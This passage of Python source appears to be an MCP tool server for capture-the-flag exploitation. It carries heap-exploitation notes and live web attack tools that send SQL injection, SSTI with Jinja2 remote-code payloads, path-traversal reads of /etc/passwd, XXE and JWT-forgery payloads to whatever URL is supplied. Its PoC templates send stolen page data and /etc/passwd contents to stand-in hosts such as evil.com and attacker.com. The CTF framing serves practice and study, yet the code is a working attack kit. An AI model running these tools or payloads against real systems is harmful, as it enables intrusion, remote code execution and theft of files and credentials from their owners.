                  "malloc", "free", "__libc_start_main", "__stack_chk_fail"]:
            if s in libc.sym:
                lines.append(f"  {s:<28} {hex(libc.sym[s])}")

        # /bin/sh string
        lines.append("\n=== Useful strings ===")
        for needle in [b"/bin/sh", b"/bin/bash", b"/bin/sh\x00", b"sh\x00"]:
            try:
                addr = next(libc.search(needle))
                lines.append(f"  {needle!r:<20} offset {hex(addr)}")
            except StopIteration:
                pass

        lines.append(
            "\n=== Usage ===\n"
            f"  leaked_puts   = u64(io.recv(6).ljust(8, b'\\x00'))\n"
            f"  libc.address  = leaked_puts - libc.sym['puts']\n"
            f"  system_addr   = libc.sym['system']         # auto-rebased\n"
            f"  binsh_addr    = next(libc.search(b'/bin/sh'))"
        )
        return "\n".join(lines)
    except Exception as e:
        return f"[ELF parse failed: {e}]"


@mcp.tool()
def pwn_heap_notes(technique: str = "overview") -> str:
    """Reference notes for common heap exploitation techniques.

    technique options:
      overview        — when to use which technique
      fastbin_dup     — fastbin double-free / dup-into-stack
      tcache_poison   — tcache poisoning (glibc 2.26+)
      unsorted_bin    — unsorted bin attack (libc leak)
      house_of_force  — House of Force (top-chunk overwrite)
      house_of_spirit — House of Spirit (fake fastbin chunk)
      safe_link       — Safe-Linking decode/encode (glibc 2.32+)
    """
    notes = {
        "overview": """\
=== Heap Exploitation — Technique Selector ===

Symptom / primitive → technique to use:

  UAF (use-after-free) on same-size chunk
    → fastbin_dup  (glibc < 2.26)
    → tcache_poison (glibc >= 2.26)

  Heap overflow into next chunk header
    → overwrite fd pointer of free chunk → fastbin_dup or tcache_poison
    → overwrite size of top chunk → house_of_force (glibc < 2.29)

  Need libc address without binary leak
    → unsorted_bin: free a large (> 0x400) non-adjacent chunk →
      fd/bk point into main_arena (libc)

  Need to allocate a fake chunk on stack / .bss
    → house_of_spirit: craft a fake fastbin chunk header, free it

  glibc 2.32+ scrambled fd pointers
    → safe_link: fd_stored = (addr >> 12) XOR real_fd  →  decode first

Run pwn_heap_notes(technique="<name>") for details on each.
""",
        "fastbin_dup": """\
=== Fastbin Double-Free / Dup-Into-Stack (glibc < 2.26) ===

Goal: allocate a chunk at an arbitrary address (e.g. stack, .bss, GOT).

Steps:
  1. Allocate three same-size fastbin chunks: A, B, C.
  2. free(A); free(B); free(A)   ← double-free (bypasses single-check via B in between)
     freelist: A → B → A → …
  3. malloc() → A  (set A->fd = &target - offset)
     freelist: B → A → &target
  4. malloc() → B
  5. malloc() → A  (again)
  6. malloc() → &target   ← write here!

Mitigations: tcache (glibc 2.26+) has per-bin count check; use tcache_poison instead.
Safe-Linking (glibc 2.32+) scrambles fd; decode with pwn_heap_notes("safe_link").
""",
        "tcache_poison": """\
=== Tcache Poisoning (glibc 2.26 – present) ===

Goal: malloc() returns an arbitrary address.

Steps (glibc < 2.32, no Safe-Linking):
  1. Allocate two same-size tcache chunks: A, B.
  2. free(B); free(A)    ← tcache freelist: A → B
  3. Overwrite A->fd (via overflow / UAF) with target_address.
     tcache: A → target_address
  4. malloc() → A
  5. malloc() → target_address   ← write here!

Steps (glibc >= 2.32, Safe-Linking active):
  • fd_stored = (chunk_addr >> 12) XOR real_fd
  • So: write  (A_addr >> 12) XOR target_address  as the fd value.
  • See pwn_heap_notes("safe_link") for the XOR formula.

Tip: __free_hook / __malloc_hook / environ are classic targets (glibc < 2.34).
     For 2.34+ target: stack via environ leak, or tcache_perthread_struct.
""",
        "unsorted_bin": """\
=== Unsorted Bin Attack — libc Address Leak ===

Goal: get a pointer into main_arena (libc) without a separate leak.

Steps:
  1. Allocate a large chunk (size > 0x400, i.e. outside fastbin/tcache range).
  2. Allocate a small "barrier" chunk after it (prevents consolidation with top).
  3. free(large_chunk).
     → chunk goes to unsorted bin; fd and bk both point into main_arena.
  4. Read fd/bk from the freed chunk (via UAF, heap info leak, etc.).
     leaked = fd    →   libc.address = leaked - libc.sym['main_arena'] - offset
     (offset is typically 0x60 for main_arena.top on x86-64)

Helper:
  libc_base = leaked_fd - (libc.sym['__malloc_hook'] + 0x70)  # common shortcut
""",
        "house_of_force": """\
=== House of Force (glibc < 2.29) ===

Goal: allocate a chunk at any address by corrupting the top-chunk (wilderness) size.

Prerequisites: heap overflow reaching the top-chunk size field.

Steps:
  1. Overwrite top-chunk size with 0xffffffffffffffff (unlimited size).
  2. Request a carefully crafted allocation:
       delta = target_addr - heap_top - 0x10
       malloc(delta)     ← moves top chunk to just before target
  3. malloc(any_size)    ← returns target_addr!

Typically used to allocate on the stack (via environ leak) or into __malloc_hook.
Dead in glibc 2.29+ (top-chunk size is now validated).
""",
        "house_of_spirit": """\
=== House of Spirit (glibc < 2.26, fastbin range) ===

Goal: free a fake chunk at a controlled address to get malloc() to return it later.

Steps:
  1. Craft a fake fastbin chunk at some writable address:
       fake_chunk[1] = valid_fastbin_size   (e.g. 0x40)
       fake_chunk[2] = 0                   (next chunk size — must be sane)
  2. Overwrite a pointer variable to point to &fake_chunk[0].
  3. free(that_pointer)   ← libc accepts it into the fastbin.
  4. malloc(matching_size) → &fake_chunk[0]  ← write here!

Constraints: size must match a fastbin (0x20–0x80); next chunk size 0x10–arena_size.
""",
        "safe_link": """\
=== Safe-Linking (glibc 2.32+) ===

glibc 2.32 XORs the fd pointer before storing it in free chunks:
    stored_fd = REAL_FD  XOR  (chunk_addr >> 12)

Decode a leaked stored fd:
    real_fd = stored_fd XOR (chunk_addr >> 12)

Encode a target address for tcache_poison:
    write_val = target_addr XOR (chunk_addr >> 12)

Python snippet:
    chunk_addr  = 0xdeadbeef000   # address of the freed chunk
    target      = libc.sym['__free_hook']
    write_val   = target ^ (chunk_addr >> 12)
    # overwrite chunk->fd with write_val via overflow/UAF
""",
    }

    key = technique.lower()
    if key not in notes:
        return f"[unknown technique '{technique}'. Options: {', '.join(notes)}]"
    return notes[key]


@mcp.tool()
def pwn_syscall_table(arch: str = "amd64", filter_str: str = "") -> str:
    """Return the Linux syscall table for the given architecture.

    arch: amd64 (default), x86, arm, aarch64
    filter_str: optional substring to filter syscall names (e.g. "exec", "open").
    """
    tables: dict[str, list[tuple[int, str]]] = {
        "amd64": [
            (0,"read"),(1,"write"),(2,"open"),(3,"close"),(4,"stat"),(5,"fstat"),
            (9,"mmap"),(10,"mprotect"),(11,"munmap"),(12,"brk"),
            (20,"writev"),(21,"access"),(39,"getpid"),(57,"fork"),(59,"execve"),
            (60,"exit"),(61,"wait4"),(62,"kill"),(63,"uname"),(79,"getcwd"),
            (83,"mkdir"),(87,"unlink"),(89,"readlink"),(90,"chmod"),
            (105,"setuid"),(106,"getuid"),(110,"getppid"),(157,"prctl"),
            (200,"tkill"),(231,"exit_group"),(257,"openat"),(281,"epoll_pwait"),
            (317,"seccomp"),(318,"getrandom"),
        ],
        "x86": [
            (0,"restart_syscall"),(1,"exit"),(2,"fork"),(3,"read"),(4,"write"),
            (5,"open"),(6,"close"),(10,"unlink"),(11,"execve"),(20,"getpid"),
            (45,"brk"),(90,"mmap"),(91,"munmap"),(125,"mprotect"),(146,"writev"),
            (162,"nanosleep"),(174,"rt_sigaction"),(175,"rt_sigprocmask"),
            (183,"getcwd"),(195,"stat64"),(197,"fstat64"),
        ],
        "arm": [
            (0,"restart_syscall"),(1,"exit"),(2,"fork"),(3,"read"),(4,"write"),
            (5,"open"),(6,"close"),(10,"unlink"),(11,"execve"),(20,"getpid"),
            (45,"brk"),(90,"mmap"),(91,"munmap"),(125,"mprotect"),(246,"exit_group"),
        ],
        "aarch64": [
            (0,"io_setup"),(3,"io_cancel"),(19,"eventfd2"),(23,"dup"),(29,"ioctl"),
            (56,"openat"),(57,"close"),(63,"read"),(64,"write"),(88,"utimensat"),
            (93,"exit"),(94,"exit_group"),(96,"set_tid_address"),(160,"uname"),
            (172,"getpid"),(174,"getuid"),(175,"geteuid"),(176,"getgid"),
            (220,"clone"),(221,"execve"),(222,"mmap"),(226,"mprotect"),
            (233,"madvise"),(261,"prlimit64"),(278,"getrandom"),
        ],
    }
    key = arch.lower().replace("-", "").replace("_", "")
    table = tables.get(key) or tables.get({"x86_64": "amd64", "i386": "x86"}.get(key, ""))
    if table is None:
        return f"[unsupported arch '{arch}'. Options: {', '.join(tables)}]"

    lines = [f"=== Linux syscall table ({arch}) ===",
             f"{'No.':<6} {'Name':<24} {'Reg':<10}",
             "-" * 42]
    reg = {"amd64": "rax", "x86": "eax", "arm": "r7", "aarch64": "x8"}.get(key, "")
    for num, name in sorted(table):
        if filter_str and filter_str.lower() not in name:
            continue
        lines.append(f"{num:<6} {name:<24} {reg}")
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# WEB EXPLOITATION TOOLBOX
# ---------------------------------------------------------------------------

@mcp.tool()
def web_http_request(url: str, method: str = "GET", headers: str = "",
                     body: str = "", follow_redirects: bool = True,
                     timeout: int = 15) -> str:
    """Send a raw HTTP request to a web challenge target and return full response.

    method:           GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD
    headers:          newline-separated Key: Value pairs (e.g. "Cookie: s=abc\\nX-Foo: bar")
    body:             raw request body string (for POST/PUT)
    follow_redirects: follow 3xx redirects (default True)
    """
    import requests as _req, warnings
    warnings.filterwarnings("ignore")
    if not url.lower().startswith(("http://", "https://")):
        raise ValueError("url must start with http:// or https://")
    hdr = {}
    for line in headers.splitlines():
        if ":" in line:
            k, _, v = line.partition(":")
            hdr[k.strip()] = v.strip()
    resp = _req.request(
        method.upper(), url, headers=hdr,
        data=body.encode() if body else None,
        allow_redirects=follow_redirects,
        timeout=timeout, stream=True, verify=False,
    )
    raw_body = resp.raw.read(HTTP_FETCH_MAX_BYTES, decode_content=True)
    hdr_block = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
    body_text = raw_body.decode("utf-8", errors="replace")
    redirect_chain = ""
    if resp.history:
        chain = " -> ".join(str(r.status_code) + " " + r.url for r in resp.history)
        redirect_chain = f"\nRedirect chain: {chain}"
    return (
        f"HTTP {resp.status_code} {resp.reason}  [{method.upper()} {url}]{redirect_chain}\n"
        f"{hdr_block}\n\n{body_text[:8000]}"
        + (f"\n\n[body truncated - {len(raw_body)} bytes total]" if len(raw_body) > 8000 else "")
    )


@mcp.tool()
def web_sqli_test(url: str, param: str, method: str = "GET",
                  extra_headers: str = "", db_type: str = "mysql") -> str:
    """Probe a single parameter for SQL injection using error-based and boolean detection.

    Sends a baseline, an always-true payload, and a syntax-error payload,
    then compares response lengths/content to infer injectable behaviour.

    db_type: mysql | postgres | mssql | sqlite
    """
    import requests as _req, warnings
    warnings.filterwarnings("ignore")
    hdr = {"User-Agent": "Mozilla/5.0"}
    for line in extra_headers.splitlines():
        if ":" in line:
            k, _, v = line.partition(":")
            hdr[k.strip()] = v.strip()
    error_payloads = {
        "mysql":    ["'", "' OR 1=1--", "' AND SLEEP(0)--"],
        "postgres": ["'", "' OR 1=1--", "'; SELECT pg_sleep(0)--"],
        "mssql":    ["'", "' OR 1=1--", "'; WAITFOR DELAY '0:0:0'--"],
        "sqlite":   ["'", "' OR 1=1--", "' OR '1'='1"],
    }
    payloads = error_payloads.get(db_type.lower(), error_payloads["mysql"])
    results = []
    baseline_len = None
    for payload in ["", *payloads]:
        if method.upper() == "GET":
            from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            try:
                r = _req.get(test_url, headers=hdr, timeout=10, verify=False)
            except Exception as e:
                results.append(f"  payload={payload!r:30s} -> ERROR: {e}")
                continue
        else:
            try:
                r = _req.post(url, data={param: payload}, headers=hdr, timeout=10, verify=False)
            except Exception as e:
                results.append(f"  payload={payload!r:30s} -> ERROR: {e}")
                continue
        body = r.text
        length = len(body)
        if baseline_len is None:
            baseline_len = length
            results.append(f"  baseline (no payload)           -> {r.status_code}  len={length}")
            continue
        delta = length - baseline_len
        error_keywords = ["sql", "syntax", "mysql", "ora-", "pg_query", "warning", "error",
                          "unterminated", "quoted", "invalid query"]
        has_error = any(k in body.lower() for k in error_keywords)
        flag = " <- DB ERROR DETECTED" if has_error else (" <- diff" if delta != 0 else "")
        results.append(f"  payload={payload!r:30s} -> {r.status_code}  len={length}  d={delta:+d}{flag}")
    return (
        f"SQLi probe: {method.upper()} {url}  param={param!r}  db={db_type}\n\n"
        + "\n".join(results)
        + "\n\nNote: length/status differences suggest injection; confirm manually."
    )


@mcp.tool()
def web_sqli_union_probe(url: str, param: str, method: str = "GET",
                         max_cols: int = 10, extra_headers: str = "") -> str:
    """Find the UNION SELECT column count and a visible column index via error-based probing.

    Tries UNION SELECT NULL,NULL,... up to max_cols. Then probes string visibility
    with 'FUZZ' to find which column appears in the response.
    """
    import requests as _req, warnings
    warnings.filterwarnings("ignore")
    hdr = {"User-Agent": "Mozilla/5.0"}
    for line in extra_headers.splitlines():
        if ":" in line:
            k, _, v = line.partition(":")
            hdr[k.strip()] = v.strip()

    def _send(payload: str):
        if method.upper() == "GET":
            from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [payload]
            r = _req.get(urlunparse(parsed._replace(query=urlencode(qs, doseq=True))),
                         headers=hdr, timeout=10, verify=False)
        else:
            r = _req.post(url, data={param: payload}, headers=hdr, timeout=10, verify=False)
        return r.status_code, len(r.text), r.text

    results = ["=== UNION column count probe ==="]
    found_cols = None
    baseline_status, baseline_len, _ = _send("'")
    for n in range(1, max_cols + 1):
        nulls = ",".join(["NULL"] * n)
        payload = f"' UNION SELECT {nulls}--"
        try:
            status, length, body = _send(payload)
        except Exception as e:
            results.append(f"  cols={n}: ERROR {e}")
            continue
        diff = length - baseline_len
        error = any(k in body.lower() for k in ["error", "syntax", "operands"])
        mark = ""
        if not error and status < 400:
            mark = " <- ACCEPTED"
            if found_cols is None:
                found_cols = n
        results.append(f"  cols={n:2d}: status={status}  len={length}  d={diff:+d}{mark}")
    if found_cols:
        results.append(f"\nColumn count: {found_cols}")
        results.append("=== Visible column probe ===")
        for i in range(1, found_cols + 1):
            cols = ["NULL"] * found_cols
            cols[i - 1] = "'FUZZ'"
            payload = f"' UNION SELECT {','.join(cols)}--"
            try:
                _, _, body = _send(payload)
                vis = "VISIBLE in response <- use for data extraction" if "FUZZ" in body else "not visible"
                results.append(f"  column {i}: {vis}")
            except Exception as e:
                results.append(f"  column {i}: ERROR {e}")
    else:
        results.append("\n[No accepted column count — try different comment style or db_type]")
    return "\n".join(results)


@mcp.tool()
def web_csrf_analyze(html: str) -> str:
    """Analyze raw HTML for CSRF vulnerabilities: missing tokens, GET forms, cookie SameSite issues.

    Paste the page HTML (from web_http_request) as the html argument.
    Checks all forms for CSRF token fields and reports cookie security attributes.
    """
    findings = []
    form_pattern = re.compile(r'<form[^>]*>.*?</form>', re.DOTALL | re.IGNORECASE)
    input_pattern = re.compile(r'<input[^>]*>', re.IGNORECASE)
    forms = form_pattern.findall(html)
    if not forms:
        findings.append("[no <form> tags found in HTML]")
    else:
        for i, form in enumerate(forms):
            action = re.search(r'action=["\']([^"\']*)["\']', form, re.I)
            method = re.search(r'method=["\']([^"\']*)["\']', form, re.I)
            action_val = action.group(1) if action else "(none)"
            method_val = (method.group(1) if method else "GET").upper()
            inputs = input_pattern.findall(form)
            token_fields = [inp for inp in inputs if re.search(
                r'(csrf|token|nonce|_token|authenticity)', inp, re.I)]
            issues = []
            if not token_fields:
                issues.append("NO CSRF token field found")
            if method_val == "GET":
                issues.append("Form uses GET - state-changing GET requests are always CSRF-vulnerable")
            status = "VULNERABLE" if issues else "Appears protected"
            findings.append(
                f"\nForm {i+1}: action={action_val!r}  method={method_val}  [{status}]"
                + "".join(f"\n  - {x}" for x in issues)
            )
    findings.append(
        "\n=== CSRF PoC template ===\n"
        "<form method='POST' action='TARGET_URL'>\n"
        "  <input type='hidden' name='PARAM' value='VALUE'/>\n"
        "</form>\n"
        "<script>document.forms[0].submit();</script>"
    )
    return "\n".join(findings)


@mcp.tool()
def web_jwt_attacks(token: str) -> str:
    """Run a full suite of JWT attack checks: alg:none, RS256->HS256, weak secret
    brute-force, missing claims, sensitive payload data, and kid/jku injection hints.
    """
    import json, time, hmac as _hmac, hashlib as _hl
    parts = token.strip().split(".")
    if len(parts) < 2:
        return "[not a valid JWT]"

    def _b64d(s: str) -> dict:
        s += "=" * (-len(s) % 4)
        return json.loads(base64.urlsafe_b64decode(s))

    def _b64e(obj: dict) -> str:
        return base64.urlsafe_b64encode(
            json.dumps(obj, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

    header  = _b64d(parts[0])
    payload = _b64d(parts[1])
    sig     = parts[2] if len(parts) > 2 else ""
    findings = [
        f"=== JWT Header  ===\n{json.dumps(header,  indent=2)}",
        f"=== JWT Payload ===\n{json.dumps(payload, indent=2)}",
        "\n=== Attack checks ===",
    ]
    # 1. alg:none
    none_tok = f"{_b64e(dict(header, alg='none'))}.{parts[1]}."
    findings.append(
        f"[1] alg:none bypass:\n"
        f"    {none_tok}\n"
        f"    {_b64e(dict(header, alg='None'))}.{parts[1]}.\n"
        f"    {_b64e(dict(header, alg='NONE'))}.{parts[1]}."
    )
    # 2. RS256 -> HS256
    if header.get("alg", "").upper() == "RS256":
        findings.append(
            f"[2] Algorithm confusion (RS256->HS256):\n"
            f"    sig = hmac.new(public_key_bytes, '{_b64e(dict(header, alg='HS256'))}.{parts[1]}'.encode(), sha256).digest()"
        )
    else:
        findings.append("[2] Algorithm confusion: alg is not RS256")
    # 3. Weak secret
    common_secrets = ["secret","password","123456","qwerty","admin","key","test",
                      "jwt","token","changeme","supersecret","mysecret","","null"]
    cracked = None
    data = f"{parts[0]}.{parts[1]}".encode()
    try:
        sig_bytes = base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4))
        for s in common_secrets:
            if _hmac.new(s.encode(), data, _hl.sha256).digest() == sig_bytes:
                cracked = s; break
    except Exception:
        pass
    findings.append(
        f"[3] Weak secret: {'FOUND: ' + repr(cracked) if cracked else 'not in common list'}"
    )
    # 4. Claims
    now = int(time.time())
    issues = []
    if "exp" not in payload: issues.append("No 'exp' - token never expires")
    elif payload["exp"] < now: issues.append(f"Token EXPIRED at {payload['exp']}")
    if "iss" not in payload: issues.append("No 'iss' issuer claim")
    if "aud" not in payload: issues.append("No 'aud' audience claim")
    findings.append("[4] Claim issues:\n" + ("\n".join(f"    - {x}" for x in issues) or "    OK"))
    # 5. Sensitive data
    sensitive = {"password","passwd","secret","key","token","ssn","api_key","private_key"}
    leaked = [k for k in payload if k.lower() in sensitive]
    findings.append(f"[5] Sensitive keys in payload: {leaked if leaked else 'none'}")
    # 6. kid/jku
    if "kid" in header:
        findings.append(
            f"[6] kid={header['kid']!r} - try SQLi: ' UNION SELECT 'attacker_secret'--  "
            f"or path traversal: ../../../../dev/null"
        )
    for k in ("jku", "x5u", "jwks_uri"):
        if k in header:
            findings.append(f"[6] {k}={header[k]!r} - host your own JWKS at a controlled URL")
    return "\n\n".join(findings)


@mcp.tool()
def web_ssti_detect(url: str, param: str, method: str = "GET",
                    extra_headers: str = "") -> str:
    """Probe a parameter for Server-Side Template Injection across all major engines.

    Tests arithmetic probes for Jinja2, Twig, Freemarker, Mako, Pebble, Velocity,
    ERB, Smarty, and Spring EL. Confirms by looking for the computed result in the response.
    """
    import requests as _req, warnings
    warnings.filterwarnings("ignore")
    hdr = {"User-Agent": "Mozilla/5.0"}
    for line in extra_headers.splitlines():
        if ":" in line:
            k, _, v = line.partition(":")
            hdr[k.strip()] = v.strip()
    probes = [
        ("{{7*7}}",              "49",       "Jinja2/Twig"),
        ("${7*7}",               "49",       "Freemarker/Mako/SpringEL"),
        ("#{7*7}",               "49",       "Pebble/Velocity/Thymeleaf"),
        ("<%= 7*7 %>",           "49",       "ERB/EJS"),
        ("{php}echo 7*7;{/php}", "49",       "Smarty"),
        ("{{7*'7'}}",            "7777777",  "Jinja2 (not Twig)"),
        ("*{7*7}",               "49",       "Thymeleaf"),
        ("[[${7*7}]]",           "49",       "Thymeleaf inline"),
    ]
    results = [f"SSTI probe: {method.upper()} {url}  param={param!r}\n"]

    def _send(val: str) -> str:
        try:
            if method.upper() == "GET":
                from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
                parsed = urlparse(url)
                qs = parse_qs(parsed.query, keep_blank_values=True)
                qs[param] = [val]
                r = _req.get(urlunparse(parsed._replace(query=urlencode(qs, doseq=True))),
                             headers=hdr, timeout=10, verify=False)
            else:
                r = _req.post(url, data={param: val}, headers=hdr, timeout=10, verify=False)
            return r.text
        except Exception as e:
            return f"ERROR:{e}"

    for probe, expected, engine in probes:
        body = _send(probe)
        if body.startswith("ERROR:"):
            results.append(f"  {probe!r:30s} -> {body}")
        elif expected in body:
            results.append(f"  {probe!r:30s} -> VULNERABLE ({engine}) - got {expected!r}")
        else:
            results.append(f"  {probe!r:30s} -> not evaluated")
    results.append(
        "\n=== Jinja2 RCE payloads ===\n"
        "  {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n"
        "  {{config.items()}}\n"
        "  {{''.__class__.__mro__[1].__subclasses__()[<N>]('id',shell=True,stdout=-1).communicate()}}"
    )
    return "\n".join(results)


@mcp.tool()
def web_lfi_test(url: str, param: str, method: str = "GET",
                 extra_headers: str = "", os_type: str = "linux") -> str:
    """Probe a parameter for Local File Inclusion using traversal sequences.

    Tests raw, encoded, double-encoded, and PHP wrapper variants.
    Confirms by detecting /etc/passwd content or win.ini markers.
    """
    import requests as _req, warnings
    warnings.filterwarnings("ignore")
    hdr = {"User-Agent": "Mozilla/5.0"}
    for line in extra_headers.splitlines():
        if ":" in line:
            k, _, v = line.partition(":")
            hdr[k.strip()] = v.strip()
    if os_type.lower() == "windows":
        confirm_str = "[fonts]"
        traversals = ["..\\..\\..\\Windows\\win.ini", "C:\\Windows\\win.ini",
                      "%2e%2e%5c%2e%2e%5cWindows%5cwin.ini"]
    else:
        confirm_str = "root:"
        traversals = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/read=string.rot13/resource=/etc/passwd",
            "file:///etc/passwd",
            "../../../etc/passwd%00",
        ]

    def _send(val: str):
        if method.upper() == "GET":
            from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [val]
            r = _req.get(urlunparse(parsed._replace(query=urlencode(qs, doseq=True))),
                         headers=hdr, timeout=10, verify=False)
        else:
            r = _req.post(url, data={param: val}, headers=hdr, timeout=10, verify=False)
        return r.status_code, r.text

    results = [f"LFI probe: {method.upper()} {url}  param={param!r}  os={os_type}\n"]
    for t in traversals:
        try:
            status, body = _send(t)
            if confirm_str in body:
                idx = body.index(confirm_str)
                snippet = body[idx:idx+120]
                results.append(f"  VULNERABLE: {t!r}\n    -> {snippet!r}")
            else:
                results.append(f"  {status}  {t!r}")
        except Exception as e:
            results.append(f"  ERROR: {e}  {t!r}")
    results.append(
        "\n=== Post-LFI escalation ===\n"
        "  Log poisoning: inject PHP in User-Agent, include /var/log/apache2/access.log\n"
        "  php://input:   POST PHP code, include php://input\n"
        "  /proc/self/environ: may include injected HTTP headers\n"
        "  data://text/plain;base64,<b64 of PHP>: direct code execution"
    )
    return "\n".join(results)


@mcp.tool()
def web_open_redirect_test(url: str, param: str, extra_headers: str = "") -> str:
    """Test a URL parameter for open redirect vulnerabilities.

    Does NOT follow redirects — inspects Location header directly.
    Tries URL schemes, protocol-relative URLs, and common filter bypasses.
    """
    import requests as _req, warnings
    warnings.filterwarnings("ignore")
    hdr = {"User-Agent": "Mozilla/5.0"}
    for line in extra_headers.splitlines():
        if ":" in line:
            k, _, v = line.partition(":")
            hdr[k.strip()] = v.strip()
    payloads = [
        "https://evil.com", "//evil.com", "/\\evil.com",
        "https://evil.com%2F@legit.com", "https:///evil.com",
        "javascript:alert(1)", "/%09/evil.com",
        "https://legit.com.evil.com", "https://evil.com?legit.com",
        "https://evil.com#legit.com", "//\evil.com",
    ]
    from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
    results = [f"Open redirect probe: {url}  param={param!r}\n"]
    for payload in payloads:
        try:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            r = _req.get(test_url, headers=hdr, allow_redirects=False, timeout=8, verify=False)
            location = r.headers.get("Location", "")
            if location and "evil.com" in location:
                results.append(f"  VULNERABLE: {payload!r} -> Location: {location!r}")
            elif location:
                results.append(f"  ~ {r.status_code} Location={location!r}  payload={payload!r}")
            else:
                results.append(f"  {r.status_code}  no redirect  payload={payload!r}")
        except Exception as e:
            results.append(f"  ERROR: {e}  payload={payload!r}")
    return "\n".join(results)


@mcp.tool()
def web_cors_check(url: str, extra_headers: str = "") -> str:
    """Check a URL for CORS misconfiguration: origin reflection, null origin, subdomain bypass.

    Reports whether Access-Control-Allow-Origin mirrors attacker origin
    AND Access-Control-Allow-Credentials is true (the dangerous combo).
    """
    import requests as _req, warnings
    warnings.filterwarnings("ignore")
    hdr = {"User-Agent": "Mozilla/5.0"}
    for line in extra_headers.splitlines():
        if ":" in line:
            k, _, v = line.partition(":")
            hdr[k.strip()] = v.strip()
    from urllib.parse import urlparse
    parsed = urlparse(url)
    legit = f"{parsed.scheme}://{parsed.netloc}"
    origins = [
        "https://evil.com", "null",
        f"https://evil.{parsed.netloc}",
        f"https://{parsed.netloc}.evil.com",
        f"{legit}.evil.com",
    ]
    results = [f"CORS check: {url}\n"]
    for origin in origins:
        try:
            r = _req.get(url, headers={**hdr, "Origin": origin}, timeout=8, verify=False)
            acao = r.headers.get("Access-Control-Allow-Origin", "(not set)")
            acac = r.headers.get("Access-Control-Allow-Credentials", "(not set)")
            vuln = (acao == origin or acao == "*") and acac.lower() == "true"
            flag = " <- VULNERABLE (credentials + reflected origin)" if vuln else ""
            results.append(f"  Origin {origin!r:45s}\n    ACAO={acao}  ACAC={acac}{flag}")
        except Exception as e:
            results.append(f"  Origin {origin!r} -> ERROR: {e}")
    try:
        r = _req.options(url, headers={**hdr, "Origin": "https://evil.com",
                         "Access-Control-Request-Method": "POST"}, timeout=8, verify=False)
        results.append(f"\n  OPTIONS preflight -> {r.status_code}\n"
                       f"    ACAM={r.headers.get('Access-Control-Allow-Methods','(not set)')}")
    except Exception as e:
        results.append(f"\n  OPTIONS preflight -> ERROR: {e}")
    results.append(
        "\n=== PoC (if vulnerable) ===\n"
        "fetch('TARGET_URL',{credentials:'include'})\n"
        "  .then(r=>r.text()).then(d=>fetch('https://evil.com/?x='+btoa(d)))"
    )
    return "\n".join(results)


@mcp.tool()
def web_xxe_test(url: str, extra_headers: str = "",
                 target_file: str = "/etc/passwd") -> str:
    """Submit XXE payloads to an XML endpoint and check the response for file content.

    Tries classic in-band XXE, XInclude, PHP expect, and SSRF-to-metadata variants.
    """
    import requests as _req, warnings
    warnings.filterwarnings("ignore")
    hdr = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/xml"}
    for line in extra_headers.splitlines():
        if ":" in line:
            k, _, v = line.partition(":")
            hdr[k.strip()] = v.strip()
    confirm_str = "root:" if "passwd" in target_file else "[fonts]"
    payloads = {
        "classic":  (f'<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{target_file}">]>\n<root>&xxe;</root>'),
        "xinclude": (f'<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file://{target_file}"/></foo>'),
        "expect":   ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>'),
        "ssrf_aws": ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&ssrf;</root>'),
    }
    results = [f"XXE probe: POST {url}  target_file={target_file}\n"]
    for name, payload in payloads.items():
        try:
            r = _req.post(url, data=payload.encode(), headers=hdr, timeout=10, verify=False)
            if confirm_str in r.text:
                idx = r.text.index(confirm_str)
                results.append(f"  VULNERABLE ({name}): {r.text[idx:idx+200]!r}")
            elif "ami-id" in r.text.lower() or "169.254" in r.text:
                results.append(f"  SSRF->metadata ({name}): {r.text[:200]!r}")
            else:
                results.append(f"  {name}: {r.status_code} - no file content in response")
        except Exception as e:
            results.append(f"  ERROR ({name}): {e}")
    results.append(
        "\n=== Blind OOB XXE ===\n"
        "Host evil.dtd:\n"
        '  <!ENTITY % file SYSTEM "file:///etc/passwd">\n'
        '  <!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM \'http://attacker.com/?d=%file;\'>">\n'
        "  %exfil;\n"
        "Send: <!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd; %send;]><foo/>"
    )
    return "\n".join(results)


@mcp.tool()
def web_header_security_check(url: str, extra_headers: str = "") -> str:
    """Audit security headers of a URL: CSP, HSTS, X-Frame-Options, cookie flags, and more.

    Reports missing headers, weak configurations, and CSP directive issues.
    """
    import requests as _req, warnings
    warnings.filterwarnings("ignore")
    hdr = {"User-Agent": "Mozilla/5.0"}
    for line in extra_headers.splitlines():
        if ":" in line:
            k, _, v = line.partition(":")
            hdr[k.strip()] = v.strip()
    try:
        r = _req.get(url, headers=hdr, timeout=10, verify=False, allow_redirects=True)
    except Exception as e:
        return f"[request failed: {e}]"
